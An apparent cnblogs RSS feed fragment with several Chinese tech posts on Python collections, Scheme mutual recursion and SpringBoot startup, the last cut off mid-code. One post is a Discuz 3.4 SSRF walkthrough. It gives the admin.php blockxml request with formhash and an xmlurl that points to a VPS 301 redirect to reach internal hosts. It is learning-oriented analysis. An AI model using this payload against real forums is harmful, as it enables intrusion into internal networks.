<pubDate>Sun, 28 Apr 2019 15:17:00 +0000</pubDate>
<dc:creator>Python运维开发</dc:creator>
<og:description>Python中collections模块 [TOC] 这个模块实现了特定目标的容器，以提供Python标准内建容器 dict、list、set、tuple 的替代选择。 Counter：字典的子类，提</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dianel/p/10787693.html</dc:identifier>
</item>
<item>
<title>Discuz3.4-SSRF-从触发点到构造payload - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/10787682.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/10787682.html</guid>
<description>&lt;h2 id=&quot;ssrf逆向分析&quot;&gt;SSRF逆向分析&lt;/h2&gt;
&lt;h3 id=&quot;x00-前言&quot;&gt;0x00 前言&lt;/h3&gt;
&lt;p&gt;之前有复现过一些漏洞，但是每次按照别人的思路复现完了之后感觉还是有很多疑问，知道了怎么做但是不知道为什么这么做，所以这次我尝试自己从补丁一步步找到攻击链，构造poc。&lt;/p&gt;
&lt;h3 id=&quot;x01-收集情报&quot;&gt;0x01 收集情报&lt;/h3&gt;
&lt;p&gt;补丁地址：&lt;br/&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&quot; class=&quot;uri&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;查看补丁，发现如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231036229-1883155460.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删去了followlocation，也就是说对于301/302请求，curl不会去跟踪跳转。&lt;br/&gt;既然这里存在一个跳转ssrf，下面就是逆向调用链，找到程序的入口。&lt;/p&gt;
&lt;h3 id=&quot;x02-尝试逆向找到触发点&quot;&gt;0x02 尝试逆向找到触发点&lt;/h3&gt;
&lt;p&gt;首先这个存在漏洞的函数是_dfsockopen，通过Ctrl+Alt+F大法找到了位于function_core.php的dfsockopen方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231044685-8726578.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续向上找，找到了一处import_block方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231050576-1823625711.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过对dfsockopen的第一个参数进行分析，发现其刚好是import_block的第一个参数经过一些处理之后的结果。&lt;br/&gt;由于参数可控，继续向上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231100575-46652462.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;鸡冻人心的发现！第一个参数直接以$_GET传了进去！&lt;/p&gt;
&lt;h3 id=&quot;x03-尝试构造payload&quot;&gt;0x03 尝试构造payload&lt;/h3&gt;
&lt;p&gt;下面看一下如何访问到这个语句：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231106501-1581435964.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先，直接通过文件肯定是访问不了的（L10-12）。下面根据L19和L21确定url中基本要必须存在的参数。经过一系列的尝试和Ctrl+Alt+F，终于找到了入口：&lt;br/&gt;&lt;code&gt;/upload/admin.php?action=blockxml&amp;amp;operation=add&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231113458-424155583.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进一下submitcheck()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231118816-656138023.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续跟进getgpc()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231123665-1682617257.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;大概就是返回$_GET[$k]，由于这里的$k就是从前面的submitcheck('addsubmit')传进来的，所以这里只要保证$_GET['addsubmit']即可，构成的url如下：&lt;br/&gt;&lt;code&gt;/upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;继续跟，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231130918-1426329754.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到getgpc返回了$_GET['addsubmit']的值，由于我们的url参数中有此参数，因此进入到了else语句块。继续跟进submitcheck&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231136640-1575887569.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里又有一个相同的getgpc()，由于参数跟刚刚也相同，就不继续跟了，直接进入到else语句块。可以看到，首先22行有个if语句，必须把条件满足成True，否则是False的话就直接进入Else语句块，这条链就直接中断掉了。仔细看一下这个if条件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$allowget || ($_SERVER['REQUEST_METHOD'] == 'POST' &amp;amp;&amp;amp; 
!empty($_GET['formhash']) &amp;amp;&amp;amp; $_GET['formhash'] == formhash() &amp;amp;&amp;amp; 
empty($_SERVER['HTTP_X_FLASH_VERSION']) &amp;amp;&amp;amp; 
(empty($_SERVER['HTTP_REFERER']) ||      strncmp($_SERVER['HTTP_REFERER'], 'http://wsq.discuz.com/', 22) 
=== 0 || preg_replace(&quot;/https?:\/\/([^\:\/]+).*/i&quot;, &quot;\\1&quot;, 
$_SERVER['HTTP_REFERER']) == preg_replace(&quot;/([^\:]+).*/&quot;, &quot;\\1&quot;, 
$_SERVER['HTTP_HOST'])))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最外层是个or，如果$allowget是True就直接省事儿了，可是这是此方法的第二个参数，默认为0，pass。剩下的逻辑如下：&lt;br/&gt;1）必须是POST请求 &amp;amp;&amp;amp;&lt;br/&gt;2）GET请求中必须有formhash参数 &amp;amp;&amp;amp;&lt;br/&gt;3）formhash的值必须等于formhash() &amp;amp;&amp;amp;&lt;br/&gt;4）请求头中没有HTTP_X_FLASH_VERSION &amp;amp;&amp;amp;&lt;br/&gt;5.1）refer为空 ||&lt;br/&gt;5.2）referer的值以http://wsq.discuz.com/开头 ||&lt;br/&gt;5.3）referer与host的主机名部分必须相同&lt;/p&gt;
&lt;p&gt;第1、4、5条件好满足，直接抓包改即可。主要看第二个请求和第三个请求，即如何获取这个formhash。看一下函数定义：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231145045-2065481122.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其大致是计算一个数的MD5，这个数由几个$_G变量组成。既然不是一个固定的值，那么首先肯定是服务端先发给客户端，然后客户端才能带着这个$_GET['formhash']来进行请求，下面全局搜一下formhash，发现很多页面中都有这个字段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231152042-1413742906.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后随手在页面上查找一下，没想到真找到了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231158635-399271097.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（经过一些测试，这里有个比较坑的点是这个formhash在同一个session请求中是不会变的，不过前台和后台的formhash不是同一个，你不能拿前台获取的formhash作为参数去访问后台的接口）。&lt;/p&gt;
&lt;p&gt;formhash的问题到这里就解决了，会看一下上面的条件，构成的url暂时如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;POST ..../upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&amp;amp;formhash=2b23ba6f&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并且去掉referer头。&lt;br/&gt;请求之后可以发现，成功进入了if语句，然后顺其自然的到了return True。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231206325-471744371.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后就终于回到了最开始的地方，成功调用import_block()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231212797-315057022.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于这里需要$_GET['xmlurl']，我们暂且传入http://127.0.0.1:2222。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231218981-1777202150.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，最后url赋值给了$signurl，其值变成：&lt;br/&gt;&lt;code&gt;http://127.0.0.1:2222?charset=utf-8&amp;amp;clientid=&amp;amp;op=getconfig&amp;amp;sign=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;没有什么太大的变化，继续跟进后就到了最开始说的那个可能存在ssrf的_dfsockopen方法了。通过下图可以看到，先是在33行调用parse_url对用户传来的url进行解析，然后调用_isLocalip()来检查host是否是内网地址，如果是内网地址则直接return掉。所以就算这里存在ssrf，我们的url中也是不能直接传内网地址进来的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231229014-1897835831.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231237407-62866231.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接着看，这里在88行发送了请求，我在这次请求中传入的url是：&lt;code&gt;upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&amp;amp;formhash=2b23ba6f&amp;amp;xmlurl=http://127.0.0.1:2222&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231244005-2140595686.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里看一下我本地监听的2222端口：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231250470-108285756.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问成功了。&lt;/p&gt;
&lt;p&gt;下面的整理下思路，由于程序对内网地址进行了限制，导致了除127.0.0.1之外的内网地址都会直接return掉，因此这里我们需要通过一个301跳转，来实现绕过程序对内网url的限制。&lt;br/&gt;可是如果想要curl自动重定向到第一个url返回的地址中去，就必须先要将此curl的CURLOPT_FOLLOWLOCATION属性设置为true才行。然而这一点在本文一开始就已经确认了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231257281-1731664201.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面就可以通过在vps上上传一个301跳转的php脚本，内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231303457-500795946.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面把我们之前的payload中的xmlurl改成我的公网vps的ip，然后重放，同时在本地监听9999端口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231308815-278281377.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;请求结果如下，可以发现，本地的9999端口果然收到了discuz-curl发来的请求！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231316744-1032684932.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我的vps的http日志：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231323346-817798913.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，这条ssrf的攻击链就已经形成了。&lt;/p&gt;
&lt;h3 id=&quot;x04-总结&quot;&gt;0x04 总结&lt;/h3&gt;
&lt;p&gt;这次跟下来还是学到了一些东西的，比如构造payload时会遇到的一些坑，然后自己对ssrf也有了跟深入的一些理解。&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:14:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>[TOC] SSRF逆向分析 0x00 前言 之前有复现过一些漏洞，但是每次按照别人的思路复现完了之后感觉还是有很多疑问，知道了怎么做但是不知道为什么这么做，所以这次我尝试自己从补丁一步步找到攻击链，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/litlife/p/10787682.html</dc:identifier>
</item>
<item>
<title>相互递归 - 窗户</title>
<link>http://www.cnblogs.com/Colin-Cai/p/10787636.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Colin-Cai/p/10787636.html</guid>
<description>&lt;p&gt;　　相互递归就是多个函数互相定义，最常见的就是两个函数，比如f和g，f的定义中用到g，而g的定义中用到f。&lt;/p&gt;
&lt;p&gt;　　相互递归一样有无限递归的可能，最简单的:&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　f:x-&amp;gt;g(x)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　g:x-&amp;gt;f(x)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　给个最简单的没有无限递归的例子，判断一个正整数是不是偶数或者是不是奇数，用C++来描述如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_odd(unsigned x);
&lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_even(unsigned x)
{
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(x == &lt;span&gt;0u&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; is_odd(x-&lt;span&gt;1u&lt;/span&gt;&lt;span&gt;);
}
&lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_odd(unsigned x)
{
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(x == &lt;span&gt;0u&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; is_even(x-&lt;span&gt;1u&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　以上效率虽然不高（甚至不优化的情况下，可能会崩栈），但是is_even和is_odd两个函数毕竟是相互定义的，也是相互递归的一个经典例子。&lt;/p&gt;

&lt;p&gt;　　Scheme当然一样支持相互递归，r5rs中也是以上述奇偶来做例子。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(define (even?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zero?&lt;span&gt; x)
  #t
  (odd&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)
(define (odd&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zero?&lt;span&gt; x)
  #f
  (even&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　再给个稍微复杂的例子，Scheme里的append是个常用的函数，它可以传入一组列表，得到这组列表首尾拼接在一起的列表。比如：(append '(1 2 3) '(4 5 6) '(7 8 9))得到(1 2 3 4 5 6 7 8 9)。&lt;/p&gt;
&lt;p&gt;　　每个人学习Scheme的过程，基本必然伴随着append函数的自我实现。&lt;/p&gt;
&lt;p&gt;　　以下是其中一种实现(当然，append有好几种不同的实现思想)：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;(define (append . lst)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; lst)
  &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;
&lt;span&gt;  ((apply _append (cdr lst)) (car lst))
 )
)

(define (_append . lst)
 (cond
  ((&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; lst) (lambda (x) x))
  ((&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; (cdr lst))
   (lambda (x)
    (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; x)
     (car lst)
     (cons (car x) ((_append (car lst)) (cdr x)))
    )
   )
  )
  (&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; (_append (apply append lst)))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　当然，_append一般应该实现在append的内部，我这么写也是为了表示的清楚一点。这种写法是一种相对高级一点的写法，采用的算子方式，不断用闭包来传递信息，并使用了相互递归，append和_append两个函数互相定义。&lt;/p&gt;

&lt;p&gt;　　当然，一开始就说了，相互递归完全可以不只是两个函数之间的关系，可以是多个函数之间的关系。&lt;/p&gt;
&lt;p&gt;　　我这里给个例子，把正整数按照除以3得到的余数分为三类，把整除3的数称为type0，把除以3余1的数称为type1，把除以3余2的数称为type2。于是定义三个谓词函数type0? type1? type2?&lt;/p&gt;
&lt;p&gt;　　以下为实现：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(define (type0?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #t
  (type2&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)
(define (type1&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #f
  (type0&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)
(define (type2&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #f
  (type1&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　我们可以看到，&lt;/p&gt;
&lt;p&gt;　　type0?的定义中用到type2?&lt;/p&gt;
&lt;p&gt;　　type1?的定义中用到type0?&lt;/p&gt;
&lt;p&gt;　　type2?的定义中用到type1?&lt;/p&gt;

&lt;p&gt;　　测试一下，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(&lt;span&gt;for&lt;/span&gt;-&lt;span&gt;each
 (lambda (x) (display x)(newline))
 (map
  (lambda (x)
   (cons
    x
    (map (lambda (f) (f x)) (list type0&lt;/span&gt;? type1? type2?&lt;span&gt;))
   )
  )
  (range &lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;)
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　得到&lt;/p&gt;

&lt;p&gt;&lt;span&gt;(0 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(1 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(2 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(3 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(4 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(5 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(6 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(7 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(8 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(9 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(10 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(11 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(12 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(13 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(14 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(15 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(16 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(17 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(18 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(19 #f #t #f)&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:06:00 +0000</pubDate>
<dc:creator>窗户</dc:creator>
<og:description>相互递归就是多个函数互相定义，最常见的就是两个函数，比如f和g，f的定义中用到g，而g的定义中用到f。 相互递归一样有无限递归的可能，最简单的: f:x-&gt;g(x) g:x-&gt;f(x) 给</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Colin-Cai/p/10787636.html</dc:identifier>
</item>
<item>
<title>SpringBoot之旅第六篇-启动原理及自定义starter - 茶底世界</title>
<link>http://www.cnblogs.com/yuanqinnan/p/10784508.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuanqinnan/p/10784508.html</guid>
<description>&lt;h2&gt;一、引言&lt;/h2&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;SpringBoot的一大优势就是Starter，由于SpringBoot有很多开箱即用的Starter依赖，使得我们开发变得简单，我们不需要过多的关注框架的配置。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;在日常开发中，我们也会自定义一些Starter，特别是现在微服务框架，我们一个项目分成了多个单体项目，而这些单体项目中会引用公司的一些组件，这个时候我们定义Starter，可以使这些单体项目快速搭起，我们只需要关注业务开发。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;在此之前我们再深入的了解下SpringBoot启动原理。而后再将如何自定义starter。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;二、 启动原理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;要想了解启动原理，我们可以Debug模式跟着代码一步步探究，我们从入口方法开始：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ConfigurableApplicationContext run(Class&amp;lt;?&amp;gt;&lt;span&gt;[] primarySources,
      String[] args) {
   &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SpringApplication(primarySources).run(args);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里是创建一个SpringApplication对象，并调用了run方法&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;2.1 创建SpringApplication对象&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; SpringApplication(ResourceLoader resourceLoader, Class&amp;lt;?&amp;gt;&lt;span&gt;... primarySources) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.resourceLoader =&lt;span&gt; resourceLoader;
    Assert.notNull(primarySources, &lt;/span&gt;&quot;PrimarySources must not be null&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存主配置类 &lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.primarySources = &lt;span&gt;new&lt;/span&gt; LinkedHashSet&amp;lt;&amp;gt;&lt;span&gt;(Arrays.asList(primarySources));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;确定web应用类型&lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.webApplicationType =&lt;span&gt; WebApplicationType.deduceFromClasspath();
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来&lt;/span&gt;
&lt;span&gt;    setInitializers((Collection) getSpringFactoriesInstances(
          ApplicationContextInitializer.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener&lt;/span&gt;
    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从多个配置类中找到有main方法的主配置类&lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.mainApplicationClass =&lt;span&gt; deduceMainApplicationClass();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;从这个方法中可以看出，这个&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第一步&lt;/strong&gt;&lt;span&gt;：保存主配置类。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第二步&lt;/strong&gt;&lt;span&gt;：确定web应用类型。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;：setInitializers方法，这个方法走我们看带入的参数是getSpringFactoriesInstances(ApplicationContextInitializer.class)，我们再往下查看getSpringFactoriesInstances&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154758279-1489615021.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;再进入这个方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154829265-1495577981.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里就是从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer，然后再保存起来，放开断点，我们可以看到这个时候获取到的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154906731-1327862419.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第四步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener，原理也基本类似,进入断点&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154943207-949343738.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第五步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：从多个配置类中找到有main方法的主配置类。这个执行完之后，SpringApplication就创建完成&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;2.2 run方法&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;先贴出代码&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ConfigurableApplicationContext run(String... args) {
   StopWatch stopWatch &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; StopWatch();
   stopWatch.start();
